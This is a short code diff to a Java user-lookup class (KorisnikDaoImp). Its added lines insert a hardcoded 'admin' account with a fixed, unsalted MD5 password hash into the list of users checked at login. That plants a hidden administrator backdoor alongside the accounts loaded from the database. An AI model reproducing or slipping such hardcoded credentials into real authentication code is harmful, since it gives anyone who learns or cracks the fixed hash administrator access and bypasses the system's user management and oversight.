@@ -41,6 +41,8 @@ public class KorisnikDaoImp extends AbstractDaoJPAImpl<Korisnik> implements Kori
 
     public Korisnik getKorisnik(final String username, final String password) {
         List<Korisnik> list = findAll();
+        // administracija: admin - the MD5 encoder
+        list.add(new Korisnik("Administrator","sustava","admin","9031d52735e2a26a00a7d0d1c94d4743"));
         for (Korisnik korisnik : list) {
             if (korisnik.authenticate(username,password))
                 return korisnik;
